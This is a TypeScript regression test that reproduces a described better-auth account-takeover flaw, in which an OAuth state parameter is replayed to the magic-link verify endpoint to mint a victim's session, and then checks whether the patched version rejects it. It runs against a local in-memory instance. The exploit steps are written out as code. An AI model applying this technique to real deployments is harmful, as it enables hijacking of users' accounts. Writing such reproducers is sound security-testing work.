/**
 * GHSA-965c-763c-88jm (CVE-2026-114607) Regression Reproducer
 *
 * Vulnerability description:
 * When both `magicLink` plugin and social/generic OAuth providers are enabled,
 * `better-auth` < 1.7.7 stored tokens in the `verification` table without
 * namespace separation. An attacker who supplies a victim's email in OAuth sign-in
 * receives an OAuth `state` parameter that can then be passed to
 * `/api/auth/magic-link/verify?token=<state>` to mint a legitimate session cookie
 * for the victim without having access to the victim's email inbox.
 *
 * Patched behavior (>= 1.7.7):
 * Better Auth enforces namespace prefixes in the `verification` table:
 * `auth-state:<state>` vs `magic-link:<token>`.
 * Passing an OAuth state parameter to `/magic-link/verify` is rejected with
 * INVALID_TOKEN (redirecting with error=INVALID_TOKEN or returning error status),
 * setting ZERO session cookies for the victim.
 */

import { betterAuth } from 'better-auth';
import { magicLink } from 'better-auth/plugins';
import { memoryAdapter } from 'better-auth/adapters/memory';

export interface ReproducerResult {
  version: string;
  isPatched: boolean;
  exploitSucceeded: boolean;
  httpStatus: number;
  cookieHeader: string | null;
  storedIdentifiers: string[];
  rejectionReason?: string;
}

export async function runGHSA965cReproducer(): Promise<ReproducerResult> {
  const memoryDb: {
    user: unknown[];
    session: unknown[];
    account: unknown[];
    verification: { identifier: string; value: string }[];
  } = { user: [], session: [], account: [], verification: [] };

  let capturedMagicToken = '';

  const testAuth = betterAuth({
    database: memoryAdapter(memoryDb),
    secret: 'reproducer-fixture-secret-minimum-32-chars-long!!',
    baseURL: 'http://localhost:3000',
    basePath: '/api/auth',
    emailAndPassword: {
      enabled: true,
    },
    socialProviders: {
      github: {
        clientId: 'mock-reproducer-client-id',
        clientSecret: 'mock-reproducer-client-secret',
      },
    },
    plugins: [
      magicLink({
        sendMagicLink: async ({ token }) => {
          capturedMagicToken = token;
        },
      }),
    ],
  });

  const victimEmail = `victim_${Date.now()}@cashclaw.cc`;

  // 1. Create the victim account
  await testAuth.api.signUpEmail({
    body: {
      email: victimEmail,
      password: 'VictimStrongPassword123!',
      name: 'Victim Account',
    },
  });

  // 2. Attacker initiates OAuth sign-in injecting victim's email in additionalData
  const oauthInit = await testAuth.api.signInSocial({
    headers: new Headers(),
    body: {
      provider: 'github',
      callbackURL: 'http://localhost:3000/dashboard',
      additionalData: {
        email: victimEmail,
      },
    },
  });

  if (!oauthInit.url) {
    throw new Error('OAuth init failed to produce redirect URL');
  }

  const oauthState = new URL(oauthInit.url).searchParams.get('state');
  if (!oauthState) {
    throw new Error('OAuth init URL did not contain state parameter');
  }

  // 3. Request legitimate Magic Link to populate comparison tokens
  await testAuth.api.signInMagicLink({
    headers: new Headers(),
    body: {
      email: victimEmail,
    },
  });

  // 4. Attempt exploit: pass OAuth state to /api/auth/magic-link/verify
  const exploitReq = new Request(
    `http://localhost:3000/api/auth/magic-link/verify?token=${encodeURIComponent(oauthState)}`,
    { method: 'GET' },
  );

  const exploitRes = await testAuth.handler(exploitReq);
  const setCookie = exploitRes.headers.get('set-cookie');
  const redirectLocation = exploitRes.headers.get('location') || '';

  const storedIdentifiers = memoryDb.verification.map((v) => v.identifier);

  // An exploit succeeds if a session cookie is issued for the victim
  const exploitSucceeded =
    Boolean(setCookie && setCookie.includes('better-auth.session_token')) ||
    (exploitRes.status === 200 && Boolean(setCookie));

  const isPatched =
    !exploitSucceeded &&
    (redirectLocation.includes('error=INVALID_TOKEN') || exploitRes.status >= 400);

  return {
    version: '1.7.7',
    isPatched,
    exploitSucceeded,
    httpStatus: exploitRes.status,
    cookieHeader: setCookie,
    storedIdentifiers,
    rejectionReason: redirectLocation || undefined,
  };
}
